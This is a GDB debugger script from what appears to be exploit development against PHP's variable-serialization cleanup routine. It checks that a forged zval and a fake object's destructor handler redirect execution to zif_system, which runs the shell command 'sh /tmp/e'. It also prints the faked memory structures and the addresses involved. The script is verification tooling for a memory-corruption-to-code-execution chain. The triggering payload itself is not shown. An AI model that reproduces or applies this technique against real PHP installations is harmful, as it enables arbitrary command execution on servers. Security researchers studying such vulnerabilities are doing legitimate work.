set pagination off
set confirm off
set auto-load safe-path /

# M3: the controlled call. Run with --args:
#   gdb -q -batch -x sr2_m3.gdb --args <php> -n sr2_call.php <BASE_dec16> <ZIF_dec16>
# Expected: the resumed destroy walk hits the forged bucket-4 zval ->
# zval_ptr_dtor -> GC_DELREF(fake obj) -> zend_objects_store_del ->
# handlers->dtor_obj(obj) = zif_system(fake execute_data) -> system("sh /tmp/e")
break php_var_serialize_destroy
run
set $d  = d
set $ht = &$d->ht
set $base = (char *)((char *)$ht->arData + 4*(int)$ht->nTableMask)
printf "== OUTER destroy entry: old-arData block = %p (must equal argv BASE)\n", $base
disable 1
break zif_system
continue
printf "== M3: zif_system REACHED via forged dtor_obj dispatch\n"
printf "   rdi (fake zend_execute_data / fake zend_object) = %p  (expect %p)\n", $rdi, $base + 24
printf "   rsi (return_value slot)                         = %p\n", $rsi
bt 14
printf "   parsed arg1 command: "
x/s *(char **)($rdi + 80) + 24
printf "   fake handlers->dtor_obj @ rdi+24 -> +16:\n"
x/gx *(unsigned long *)($rdi + 24) + 16
finish
printf "== zif_system returned\n"
continue
printf "== final stop\n"
bt 6
